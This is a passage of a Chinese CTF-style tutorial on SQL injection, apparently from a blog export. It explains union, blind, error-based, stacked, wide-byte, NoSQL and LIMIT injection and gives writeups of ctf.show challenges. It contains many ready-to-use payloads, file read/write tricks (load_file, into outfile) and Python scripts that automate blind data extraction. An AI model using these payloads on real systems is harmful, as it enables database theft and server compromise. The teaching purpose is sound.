from此类语句，同时如果它存在SQL注入的话，那它可能不仅仅是SQL注入点，也可能是XSS点，因为后面语句可控的话，插上一个&lt;script&gt;alert(1)&lt;/script&gt;也并非难事，但这些SQL语句也并不少，这就需要我们观察语句是否可控，同时看是否过滤了，是否过滤十分严格以致于不存在漏洞，总之多多进行测试，实践出真知。\n参考文章https://xz.aliyun.com/t/7992https://xz.aliyun.com/t/11310https://www.cnblogs.com/Cl0ud/p/12824593.htmlhttps://www.cnblogs.com/wkzb/p/12732078.htmlhttps://www.cnblogs.com/zjhzjhhh/p/14338775.htmlhttps://blog.csdn.net/weixin_44770698/article/details/125656478\n","slug":"小白的代码审计之路","date":"2022-07-05T10:45:30.000Z","categories_index":"代码审计","tags_index":"代码审计","author_index":"quan9i"},{"id":"b249936ad8b44b9df7ce04e2f671a839","title":"浅析SQL注入漏洞","content":"前言在sqli-labs靶场中学过一点sql注入，最近遇到了很多此类题目，对sql注入进行了进一步的学习，汇总如下，希望能对正在学习的各位师傅们有所帮助\n漏洞相关信息漏洞成因程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。\n定义web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的 SQL语句 ，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n简单理解：前端的恶意语句插入到后端的服务器中，成功运行了攻击者想要执行的操作\n漏洞危害1、攻击者未经授权可以访问数据库中的数据，从而盗取用户数据，造成用户信息泄露。\n\n2.对数据库的数据进行增加或删除操作，例如删除数据库中重要数据的表。\n\n3.如果网站目录存在写入权限，那么攻击者可以对网页进行篡改，发布一些违法信息等。\n\n4.获取服务器最高权限，远程控制服务器，安装后门，从而修改或控制操作系统。\nsql注入常见类型（按照执行效果分类）联合查询注入联合查询是可合并多个相似的选择查询的结果集。等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起。简单的说，就是union可合并两个及以上select语句的结果集。\n前提：\n（1）这几个select语句必须拥有相同列，而且各列的数据类型也相同。\n（2）必须有显示位\n\n什么是显示位？官方的说就是执行的sql语句得到的数据会显示到界面上去，在界面上显示数据的这个位置就称位显示位简单的说就是在界面上有回显，如下图这种情况无论输入什么都显示 you are in ，此即说明不存在显示位\n2、查询语句使用的多为union select 语句union select 在查询数据库，查询列名以及查询字段信息时候都被用到，示例如下：代码：\nuname=n' union select 1,group_concat(schema_name) from information_schema.schemata  #&amp;passwd=admin&amp;submit=Submit\n3、union select 1,2,3的含义查询字段时，经常用到union select 1，2，3 这是因为 1，2，3会对应到数据库中，先查询数据库中的数据，再来输出1，2，3示例：\n?id=1'))  union select 1,2,3 from security.users into outfile \"D:\\\\1.txt\" --+\n\n输出结果\n示例2：\n: uname=0' union select 1,2,group_concat(schema_name) from information_schema.schemata#\n爆出了数据库名\n布尔盲注在SQL注入过程中，执行正确时应用程序返回的是固定界面(正确执行和错误执行的界面是不同的)。这时，我们无法根据应用程序的回显得到我们需要的数据库信息。但是可以通过构造逻辑判断来得到我们需要的信息。布尔盲注一般常用的函数为length()、substr()和ascii()函数。在这里对函数进行简单介绍\nlength():函数返回字符串str的长度，以字节为单位。\nsubstr(str,pos,len):函数从特定位置开始的字符串返回一个给定长度的子字符串\n\t\tstr参数代表待截取的字符串\n\t\tpos参数代表从什么位置开始截取\n\t\tlen参数表示字符串截取的长度\nascii()：函数输出某个字符的ascii码值\n时间盲注在SQL注入过程中，执行正确时应用程序返回的是固定界面(正确执行和错误执行的界面是相同的，界面一成不变)。这时我们可利用延时函数让 mysql 执行时间变长，进而判断出执行的语句是否正确时间盲注常用的函数为if()，sleep(), benchmark()函数，在这里对函数进行简单介绍\nif(x,x1,x2):x是条件，当条件执行结果为true时，就执行x1,否则执行x2\nsleep(t):暂停t秒执行，假如里面是1，其含义就是延时1秒\nbenchmark(t,y):对y的性能计算t次，返回结果为0\n举个例子benchmark(5000000,sha(1)，这句话的含义是对sha(1)进行性能测试，测试次数为5000000次，\n其最终输出结果为0，但是计算性能时间超过1秒了，因此从这里来说可以起到替代sleep的作用\n报错注入当web程序无法使用联合查询，但输入错误语句存在报错的时候，这时候我们就可以尝试用报错注入。\n报错注入是通过特殊函数错误使用并使其输出错误结果来获取信息的。简单点说，就是在可以进行sql注入的位置，调用特殊的函数执行，利用函数报错使其输出错误结果来获取数据库的相关信息\n前提在上方已经提过，就是界面可以回显错误信息\n常用的函数是\nupdatexml(XML_document,Xpath_string,new_value):函数利用mysql函数参数格式错误进行报错注入\n\t\tXML_document:是字符串String格式，为XML文档对象名称\n\t\tXpath_string:Xpath格式的字符串\n\t\tnew_value:string格式，替换查找到的符合条件的数据\nextractvalue(XML_document,XPath_string):同样是利用xpath语法错误来进行报错注入\n下方四个通常是联用的，这种报错的原因是主键重复\nrand()：随机输出0到1之间的数\nfloor():对括号内的数进行向下取整，比如1.9187取为1\ngroup by x:分组语句\ncount():汇总语句，如果括号里面是*就是将全部汇总\n这里举出一些payload例子及少见的报错函数(3之后是不常用的少见注入函数)\n1. floor + rand + group by\nselect * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);\nselect * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));\n\n2. ExtractValue\nselect * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));\n\n3. UpdateXml\nselect * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));\n\n4. Name_Const(>5.0.12)\nselect * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;\n\n5. Join\nselect * from(select * from mysql.user a join mysql.user b)c;\nselect * from(select * from mysql.user a join mysql.user b using(Host))c;\nselect * from(select * from mysql.user a join mysql.user b using(Host,User))c;\n\n6. exp()//mysql5.7貌似不能用\nselect * from user where id=1 and Exp(~(select * from (select version())a));\n\n7. geometrycollection()//mysql5.7貌似不能用\nselect * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));\n\n8. multipoint()//mysql5.7貌似不能用\nselect * from user where id=1 and multipoint((select * from(select * from(select user())a)b));\n\n9. polygon()//mysql5.7貌似不能用\nselect * from user where id=1 and polygon((select * from(select * from(select user())a)b));\n\n10. multipolygon()//mysql5.7貌似不能用\nselect * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));\n\n11. linestring()//mysql5.7貌似不能用\nselect * from user where id=1 and linestring((select * from(select * from(select user())a)b));\n\n12. multilinestring()//mysql5.7貌似不能用\nselect * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));\n\n堆叠注入在SQL中，分号（;）是用来表示一条sql语句的结束，那我们在一句SQL语句结束后再紧跟一句SQL语句 ，此时会不会执行两条语句答案是会，堆叠注入正是基于这种思想而来。\n举个简单例子\nmysql> select(ascii('a'));show tables;\n+--------------+\n| (ascii('a')) |\n+--------------+\n|           97 |\n+--------------+\n1 row in set (0.00 sec)\n\n+--------------------+\n| Tables_in_security |\n+--------------------+\n| emails             |\n| referers           |\n| uagents            |\n| users              |\n+--------------------+\n4 rows in set (0.00 sec)\n堆叠注入的局限性在于并不是每一个环境下都可以执行\n可能受到API或者数据库引擎不支持的限制\n可能因为权限不足而无法正确执行\n\n举个例子PHP为了防止sql注入机制，往往使用调用数据库的函数是mysql_query()函数，这个函数只运行执行一条语句，分号后面的内容将不会被执行，此时堆叠注入就失效了\n二次注入用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。我的认识：小白对此的理解:先向数据库存入恶意数据，数据在前端被转义，但在存放到数据库时保持原样，此时我们再调用此数据，执行sql查询，二次注入出现！图解如下具体过程为\n1、用户向数据库插入恶意语句（即使后端代码对语句进行了转义，如mysql_escape_string、mysql_real_escape_string转义）\n2、数据库对自己存储的数据非常放心，直接取出恶意数据给用户\n宽字节注入首先我们需要了解一下单字节和宽字节\n单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。\n宽字节字符集： 所有的字符都使用两个字节来表示。\n注：英文字母占一个字节，汉字占两字节为什么会产生宽字节注入漏洞，这是因为前端使用的是utf-8编码，后端使用的是gbk，gb2312或其他宽字节编码，这样两者就会存在出入，进而导致了宽字节注入的产生。对编码字符集的小科普\n尽管现在呼吁所有的程序都使用unicode编码，所有的网站都使用utf-8编码，来一个统一的国际规范。\n但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用着自己国家的一套编码，\n比如我国的gbk、gb2312，作为自己默认的编码类型。也有一些cms为了考虑老用户，推出了gbk和utf-8\n两个版本（例如:dedecms） 我们就以gbk字符编码为例，拉开帷幕。\nGBK全称《汉字内码扩展规范》,gbk是一种多字符编码。他使用了双字节编码方案，因为双字节编码所以\ngbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。我们可以通过输出来验证这句话。\n例如：0xD50×5C 对应了汉字“誠 ”，URL编码用百分号加字符的16进制编码表示字符，于是 %d5%5c \n经URL解码后为“誠”。\n\n前端使用的部分函数对特殊字符进行转义，添加反斜杠 \\，那我们如果能够再前面多一个字符，使其与\\组成汉字，就成功的使后面的特殊字符逃逸出来，从而可以进行注入。下方是转义时运用的部分函数\nmagic_quotes_gpc：当PHP的传参中有特殊字符就会在前面加转义字符'\\',来做一定的过滤 \naddslashes() 函数返回在预定义字符之前添加反斜杠的字符串\nmysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符\nmysql_escape_string() — 转义一个字符串\n相关知识介绍万能语句1&#39; or 1=1#经常可以在sql注入中见到，它可以显示所有的信息，这是为什么呢，下面我们来一探究竟\n$sql=\"select * from users where username='$username' and password='$pass'\";\n我们把sql语句与payload相结合，那这个sql语句就是\n$sql=\"select * from users where username='1' or 1=1 #' and password='1'\";\n那它在后端执行的实际语句就是\nselect * from users where username= '1' or 1=1 # ' and  password='1'\n因为#是注释符，后面的内容都会被注释掉，所以它执行的语句等同于\nselect * from users where username= '1' or 1=1\n这里’1’ or 1=1肯定是true(username=‘1’可能是假，但1=1肯定为true，or语句只要有一个为true就为true)，因此返回结果为true，所以执行的语句就是\nselect * from users\n因此就挑选出了所有的数据\nmd5特殊字符串首先介绍一下md5函数\nmd5(string,raw)\n\n参数 \t描述\nstring \t必需。规定要计算的字符串。\nraw \t可选。规定十六进制或二进制输出格式：\n        TRUE - 原始 16 字符二进制格式\n    \tFALSE - 默认。32 字符十六进制数\n这里当是true的时候，转成原始16字符二进制格式，此时出现的都将是乱码，我们是无法进行注入的但这里有个特殊的字符串ffifdyop，组成查询语句的时候这个hex会被转成字符串，如果转换之后的字符串包含’or’，就会和原查询语句一起组成。此时语句就称为了&#39;or&#39;6+其他字符，此时就成功执行了万能语句，进而获取了数据\nnosql注入nosql是非关系性的数据库，而mysql是关系性的数据库有关nosql相关的文章我(小白)认为这个是讲的最明白的一个NoSQL注入总结(MongoDB) 也可以参考这篇文章https://www.anquanke.com/post/id/97211\nnosql常用命令符如下\ndb.collection.find(query, projection)\n//query 可选，使用查询操作符指定查询条件\n//可选，使用投影操作符指定返回的键。查询时返回文档中所有键值， 只需省略该参数即可（默认省略）\n举例：\n//查找username为JrXnm的信息\ndb.user.find(&#123;'username':'JrXnm'&#125;) \n\nmongodb条件操作符\n比较： \n    $gt : >\n    $lt : &lt;\n    $gte: >=\n    $lte: &lt;=\n    $ne : !=、&lt;>\n    //查找用户名不为admin且password为123456的用户\n    db.user.find(&#123;'username': &#123;$ne:'admin'&#125;, 'password': '123456'&#125;)\n\n    /**\n    * : 范围查询 &#123; \"age\" : &#123; \"$gte\" : 2 , \"$lte\" : 21&#125;&#125;\n    * : $ne &#123; \"age\" : &#123; \"$ne\" : 23&#125;&#125;\n    * : $lt &#123; \"age\" : &#123; \"$lt\" : 23&#125;&#125;\n    */\n\n条件：\n    $in : in\n    $nin: not in\n    $all: all \n    $or:or\n    $and: and\n    $not: 反匹配(1.3.3及以上版本)\n    $exist: \n    //如果记录中有包含该属性的全部返回\n    db.collection.find(&#123;title:&#123;$exists:true&#125;&#125;);  \n    //查找用户名为在这个数组中的用户信息\n    db.user.find(&#123;'username': &#123;$in: ['admin', 'JrXnm']&#125;&#125;)\n\n正则：  \n    模糊查询用正则式：db.customer.find(&#123;'name': &#123;'$regex':'.*s.*'&#125; &#125;)\n    正则的另一种写法：db.user.find(&#123;'username':/jrx/i&#125;)\nlimit注入学习过p神limit注入文章后，有了如下的认识limit看似是无法进行注入的，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO有写入shell的权限，因此limit也是存在注入的，本地测试如下\nSELECT * FROM users WHERE id >0 ORDER BY id LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);\n\nSELECT * FROM users WHERE id >0 ORDER BY id LIMIT 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);\n\n经过测试之后，我发涉及到select的无法使用，怀着疑问重新查看文章后发现评论区有师傅问出了同样的问题，得知新版的已不再支持select语句\n可以相互替代的函数总结时间盲注中的时间表示时间的三种函数(第三种为笛卡尔积)\nsleep(1)\nbenchmark(5000000,sha(1)\nSELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1\n\n布尔盲注中的正则表示匹配的两种方式\nregexp\nrlike\n\n联合查询中的where当where被过滤的时候，我们可以用right join和on来代替where，这里简单介绍一下此函数\nRIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中\n没有匹配的行。\n这里本地测试几个语句，希望能对大家理解有所帮助\nselect * from users right join emails on substr(users.username,1,1)regexp('a');\n\nselect * from emails right join users on substr(username,1,1)regexp('a');\n\n注入实战联合查询0X01$sql = \"select username,password from ctfshow_user2 where \nusername !='flag' and id = '\".$_GET['id'].\"' limit 1;\";\n先输入个1试试发现回显只有两个，此时说明下面的联合查询不能用123，应该用1,2给出了拼接语句，可以看出是单引号闭合，我们此时尝试构造payload如下\n-1' union select 1,2 --+\n语句中说了，列名是ctfshow_user2，我们构造payload如下\n-1' union select 1,group_concat(password) from ctfshow_user2--+\n// -1' union select 1,group_concat(id,username,password) from  ctfshow_user2--+\n执行结果如下\n0X02&#96;&#96;&#96;sql\n&#x2F;&#x2F;对传入的参数进行了过滤\n  function waf($str)&#123;\n   &#x2F;&#x2F;代码过于简单，不宜展示\n  &#125;\n查询字段数\n1' order by 3 --+\n这说明有字列数为3，此时尝试union select构造语句\n-1' union seleCt 1,group_concat(username),group_concat(password) from ctfshow_user --+\n报错，我一开始想的是字母和数字可能被过滤了，但我想到order by查询时没有报错，这说明应该是过滤了某个固定字符，尝试大小写绕过\n-1' uNion sElect 1,group_concat(username),group_concat(password) from ctfshow_user --+\n\n0X03返回逻辑\nif(!preg_match('/[\\x00-\\x7f]/i', json_encode($ret)))&#123;\n  $ret['msg']='查询成功';\n&#125;\n知识科普\n\\xnn 匹配ASCII代码中十六进制代码为nn的字符\n0x00&#x3D;&#x3D;0\n0x7f&#x3D;&#x3D;127\n针对本关的话，我们可以采用写入文件来进行绕过从而获取flag，我们知道文件网页上回显出的文件一般位于/var/www/html下，因此我们可构造payload如下\n0' union select username,password from ctfshow_user5 into outfile \n'/var/www/html/quan.txt'--+ \n此时我们再去访问quan.txt\n布尔盲注0X01//密码检测\n  if(!is_numeric($password))&#123;\n    $ret['msg']='密码只能为数字';\n    die(json_encode($ret));\n  &#125;\n\n  //密码判断\n  if($row['pass']==$password)&#123;\n      $ret['msg']='登陆成功';\n    &#125;\n\n  //TODO:感觉少了个啥，奇怪\n    if(preg_match('/file|into|ascii/i', $username))&#123;\n        $ret['msg']='用户名非法';\n        die(json_encode($ret));\n    &#125;\n      \n本关过滤了ascii，但ord函数在处理单字符时与ascii效果相同，因此我们这里替换一下即可利用的基本原理是布尔盲注，在界面中测试的话payload就是\nusername: -1' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),1,1)='c',1,0)#\npassword: 1\n此时回显密码错误，那就说明用户语句执行正确，说明注入成功，此时响应为&#123;&quot;code&quot;:0,&quot;msg&quot;:&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;,&quot;count&quot;:0,&quot;data&quot;:[]&#125;，可以根据\\u5bc6\\u7801\\u9519\\u8bef来进行判断username是否执行正确也就得到了首字母，但由于这样测试太慢，我们可以利用python脚本来进行\n#@Author:quan9i\nimport requests\n\nurl = \"http://f9eb9d85-b9e7-4719-8ab3-a1aecfd29198.challenge.ctf.show/api/\"\nflag=\"\"\nfor i in range(1,55):\n    for j in \"0123456789abcdefghijklmnopqrstuvwxyz_-&#123;&#125;\":\n            #查数据库\n            # payload=\"-1' or if(substr((select database()),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)\n            #查表\n            # payload=\"-1' or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)\n            #查列\n            # payload=\"-1' or if(substr((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)\n            #查字段\n            payload=\"-1' or if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)='&#123;&#125;',1,0)#\".format(i,j)\n            #print(payload)\n            data=&#123;\n                'username':payload,\n                'password':0\n            &#125;\n            r=requests.post(url=url,data=data)\n            if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in r.text:\n                flag += j\n                print(flag)\n                if j=='&#125;':\n                    exit()\n                break\n        \n0X02  //拼接sql语句查找指定ID用户\n  $sql = \"select pass from ctfshow_user where username = &#123;$username&#125;\";\n      \n\n返回逻辑\n  //用户名检测\n  if(preg_match('/select|and| |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\x26|\\x7c|or|into|from|where|join|sleep|benchmark/i', $username))&#123;\n    $ret['msg']='用户名非法';\n    die(json_encode($ret));\n  &#125;\n\n  //密码检测\n  if(!is_numeric($password))&#123;\n    $ret['msg']='密码只能为数字';\n    die(json_encode($ret));\n  &#125;\n\n  //密码判断\n  if($row['pass']==$password)&#123;\n      $ret['msg']='登陆成功';\n看密码判断，$row[&#39;pass&#39;]可以理解为返回查询的结果，在和后面的password进行弱比较，这里我需要简单介绍一下intval函数\nintval():当里面内容为数字时候，输出的是数字\n\t\t 当内容为字母时，输出的是0\n此时我们构造username=0，因为username中都是字符串，其数字值也是0，所以返回了所有以字母开头的数据，同理如果pass中的数据也都是字母开头，此时我们再让password等于0，条件就可以成功执行，flag也会回显出来。这里我们尝试0/0进行登录提示密码错误，说明存在全字母的username，但password不是全字母。此时查看响应尝试1/0登录提示查询失败，说明不存在username为1的用户，此时查看响应综合来看，说明当username正确执行时，会出现\\u5bc6\\u7801\\u9519\\u8bef字段，由题目提示可知文件路径在/var/www/html/api/index.php下，因此我们可以利用load_file函数来获取内容，在这里对load_file简单介绍一下\nload_file():将括号内的文件内容进行读取，并以字符串形式返回\n用if语句将文件内容读取并进行正则匹配，正确执行时输出0，否则为1。此时username如果执行正确就可以查到数据，脚本如下\n#@Author:quan9i\nimport requests\n\nurl = \"http://044bf66a-c828-4484-8281-4668e93c34ea.challenge.ctf.show/api/index.php\"\nflag=\"ctfshow&#123;\"\nfor i in range(0,100):\n    for j in range(45,127):\n        if(chr(j)!='?'and chr(j)!='.'):\n            payload=\"if((load_file('/var/www/html/api/index.php'))regexp('&#123;&#125;'),0,1)\".format(flag+chr(j))\n            data=&#123;\n                'username':payload,\n                'password':0 #这里可以随便输入，这种方式获取flag不需要看password\n            &#125;\n            r=requests.post(url=url,data=data)\n            if \"\\\\u5bc6\\\\u7801\\\\u9519\\\\u8bef\" in r.text:\n                flag += chr(j)\n                print(flag)\n                if chr(j)=='&#125;':\n                    exit()\n                break\n        else:\n            print(\"成功绕过元字符\")\n执行结果注:这里j不能取+ ? . 是因为这三个属于正则表达式中的元字符，会污染正则匹配，还有ascii码的(0,32)及127是控制字符，也会影响脚本\n0X03（布尔盲注正则版）//拼接sql语句查找指定ID用户\n  $sql = \"select count(pass) from \".$_POST['tableName'].\";\";\n      \n返回逻辑\n//对传入的参数进行了过滤\n  function waf($str)&#123;\n    return preg_match('/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|file|\\=|or|\\x7c|select|and|flag|into/i', $str);\n  &#125;\n\n查询结果\n\n//返回用户表的记录总数\n      $user_count = 0;\n      \n可以看出注入方式改为post注入，我们查看sql语句可以发现我们只需要以post方式传入表名即可正确执行sql语句，简单测试一下\ntableName=ctfshow_user\n执行结果发现可以执行，此时我们可以利用where进行模糊匹配，从而得到我们想要的flagpayload\ntableName=`ctfshow_user`where(substr(`pass`,1,1)regexp('c'))\n\n执行的实际语句\nselect count(pass) from \"tableName=`ctfshow_user`where(substr(`pass`,1,1)regexp('c'))\";\n涉及知识\nsubstr(x,y,z)\nx是字符串那部分，我们在这里可以理解为列名\ny指的是从y开始，例如当y=1是就从第一个字母开始\nz指的是截取几位，例如当z=1时就代表截取1位\n\nregexp模糊匹配\n在这里表示的是将结果\n\n本地测试一下\nselect * from users where substr(`username`,1,1)regexp('a');\n执行结果可见其可以把username列中首字母为a的全部取出来\n你可以把第一个1依次后推，在bp中，设置c为变量进行爆破，可以依次得到flag不过这样速度较慢，搞一下脚本\nimport requests\nurl='http://6b306aef-1841-4432-8af3-599dd5db1815.challenge.ctf.show/select-waf.php'\nflagstr=r\"1234567890qwertyuiopasdfghjklzxcvbnm-_&#125;&#123;\"\nflag='ctfhsow' //设置flag格式，再进行匹配更精确\nfor i in range(8,50): //ctfshow已经7位，故从第八位开始\n    for j in flagstr:\n        data = &#123;\n            'tableName': \"(ctfshow_user)where(substr(pass,&#123;&#125;,1))regexp('&#123;&#125;')\".format(str(i),j) //第一次的时候就是在全部列的pass下第八位中依次寻找j的，最终取出来，这里取出&#123;\n        &#125;\n        exp = requests.post(url, data=data)\n        if \"$user_count = 1;\" in exp.text:\n            flag += j\n            print(flag)\n            break\n\n时间盲注0X01(时间盲注笛卡尔积版)function waf($str)&#123;\n       return preg_match('/sleep|benchmark/i',$str);\n   &#125;   \n过滤这两个函数，有一种东西叫笛卡尔积，简单介绍一下笛卡尔积，又叫cross join，是SQL中两表连接的一种方式。通常我们都要在实际SQL中避免直接使用笛卡尔积，因为它会使“数据爆炸”，尤其是数据量很大的时候。本地测试如下\nSELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables D;\n\n由此可见可以代替被ban的函数，因此我们可以构造payload如下\nif(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)，1,1)='1',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)\n但由于手动较慢，因此选用脚本，脚本如下\n#@Author:quan9i\nimport requests\n\nurl = \"http://d0565861-1643-4f0f-8ef3-10c53ce54e13.challenge.ctf.show/api/\"\nflag=\"ctfshow&#123;\"\nfor i in range(9,55):\n    for j in \"0123456789ab,cdefghijklmnopqrstuvwxyz_-&#123;&#125;\":\n            #查表\n            #payload=\"if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1)='&#123;&#125;',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),1)\"\n            #查字段\n            payload=\"if(substr((select flagaac from ctfshow_flagxc),&#123;&#125;,1)='&#123;&#125;',(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables D),1)\"\n            #print(payload)\n            data=&#123;\n                'ip':payload.format(i,j),\n                'debug':'0'\n            &#125;\n            print(data)\n            try:\n                response = requests.post(url=url,data=data,timeout=0.7)\n                #print(\"执行失败\")\n            except Exception as e:\n                #print(\"执行成功\")\n                flag += j\n                print(flag)  \n\n0X02//分页查询\n$sql = select * from ctfshow_user group by $username;\n看起来是group by注入，在查询了有关group by注入后发现，大部分都是group by报错注入，这位师傅的文章写的还是很不错的https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html，当我p颠p颠的去注入报错注入的payload\nconcat(database(),floor(rand()*2))\n发现没反应，此时才想到压根就没回显，又怎么可能有报错信息，因此我们这里只能用时间盲注来进行获取flag，示例payload如下\nconcat(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;1&#125;,1)='&#123;c&#125;',sleep(1),0),1);\n\n脚本如下\n#@Author:quan9i\nimport requests\n\nurl = \"http://62e82e3d-ef80-4818-86f3-50e23a409d63.challenge.ctf.show/api/\"\nflag=\"ctfshow&#123;\"\nfor i in range(9,55):\n    for j in \"0123456789ab,cdefghijklmnopqrstuvwxyz_-&#123;&#125;\":\n            #查数据库\n            #payload=\"select group_concat(table_name) from information_schema.tables where table_schema=database()\"\n            #print(payload)\n            #查表\n            #payload=\"select group_concat(table_name) from information_schema.tables where table_schema=database())\"\n            #print(payload)\n            #查列                                                                                                                                                                                                                                                                                 \n            #payload=\"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flaga'\"\n            #print(payload)\n            #查字段\n            payload=\"select flagaabc from ctfshow_flaga\"\n            #print(payload)\n            params=&#123;\n                'u':f\"concat(if(substr((&#123;payload&#125;),&#123;i&#125;,1)='&#123;j&#125;',sleep(1),0),1);\"\n            &#125;\n            print(params)\n            try:\n                response = requests.get(url=url,params=params,timeout=1)\n                #print(\"执行失败\")\n            except Exception as e:\n                #print(\"执行成功\")\n                flag += j\n                print(flag)                   \n0X03（二分法时间盲注）提示用了单引号\n本关看靶场的话不知道注入点在哪(可能仅对我这个小白而言)，但仔细去查看首页界面的js文件的话，可以发现api下传入的数据是ip和debug，ip这个的话我猜测是可注入的点，测试了一下，确实是这样本地测试如下（post注入）\ndebug=0&amp;ip=1' or if(ascii(substr((select group_concat\n(table_name) from information_schema.tables where \ntable_schema=database()),1,1))>1,sleep(1),0) #\n但由于这样比较缓慢，因此这里需要借用脚本，脚本内容如下\nimport requests\n\nurl = \"http://98966a40-1d76-48f8-a258-f9a70e6ff8dc.challenge.ctf.show/api/\"\n\nresult = \"\"\ni = 0\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n\n    while head &lt; tail:\n        mid = (head + tail) >> 1\n        # 查数据库\n        payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"\n        # 查字段\n        # payload = \"select group_concat(column_name) from information_schema.columns where table_name='ctfshow_fl0g'\"\n        # 查flag\n        #payload = \"select flaga from ctfshow_flagx\"\n        data = &#123;\n            'ip': f\"if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))>&#123;mid&#125;,sleep(1),1)\",\n            'debug': '0'\n        &#125;\n        try:#try后为检测范围\n            r = requests.post(url, data=data, timeout=1)#延时超过一秒就按异常处理，因为设置的是一秒，所以异常时即为正确情况\n            tail = mid\n        except Exception as e : #检测到异常时\n            head = mid +1\n\n    if head != 32:\n        result += chr(head)\n    else:\n        break\n    print(result)\n报错注入0X01发现在unname中注入会被转义，所以我们选择在passwd中进行注入此时采用xpath函数来破解获取表payload：\nuname=admin &amp;passwd=admin' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1)#&amp;submit=Submit\n 获取表名payload：\nuname=admin&amp;passwd=admin' or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1)),1) #&amp;submit=Submit\n 获取列名payload\nuname=admin&amp;passwd=admin' or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='emails' limit 0,1)),1) #&amp;submit=Submit\n 获取字段信息payload \nuname=admin&amp;passwd=admin' or updatexml(1,concat(0x7e,(select email_id from security.emails limit 0,1)),1) #&amp;submit=Submit\n\n0X02 $sql = \"select id,username,pass from ctfshow_user where id = '\".$id.\"' limit 1;\";\n返回逻辑\n过滤updatexml extractvalue \n这里把两个常用的报错注入函数都给ban了，那这里就需要利用双查询注入了详细讲解双查询注入因此本关我们构造payload如下\n爆表\n?id=-1' union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a%23\n爆列\n?id=-1' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='\nctfshow_flags' limit 1,1),0x7e,floor(rand()*2))a from information_schema.tables group by a%23\n爆flag\n?id=-1' union select 1,count(*),concat((select flag2 from ctfshow_flags ),0x7e,floor(rand()*2))a from information_schema.tables group by a%23\n堆叠注入0X01本关我们尝试以弱口令admin作为账号，对pwd进行堆叠注入测试，构造payload如下\n1'insert into users(id,username,password) values(88,'aaa','bbb');#\n执行结果此时查看sql数据库查看源码\n$username = mysqli_real_escape_string($con1, $_POST[\"login_user\"]);\n$password = $_POST[\"login_password\"];\n\nusername进行了转义，但pwd没有用函数进行限制,因此这里就出现了堆叠注入漏洞\n0X02打开靶场后，首先判断一下id包裹方式判断出为单引号包裹，此时判断一下字段数说明字段为2，此时尝试使用联合查询发现联合查询被ban，此时我们无法使用联合查询进行注入，尝试使用堆叠注入，还有部分被过滤，select无法使用，我们可以使用show，进行爆库构造如下payload\n-1';show databases;#\n执行结果如下爆表爆出列名\n-1';show columns from `1919810931114514`;#\n执行结果\n-1';show columns from `words`;#\n\n这里我们可以看出这个words表是默认查询的表(这张表的结构是一个数字加一个字符串)，众所周知show是无法查看字段信息的，我们该如何获取flag呢这里alert和rename没有被限制，我们可以利用rename将words这张表改名为words1，再将数字表改名为words，但是呢，此时他是缺少了一个id列的，因此我们可以用alert将flag列改名为id列，并规定类型为varchar，构造payload如下\n1';RENAME TABLE `words` TO 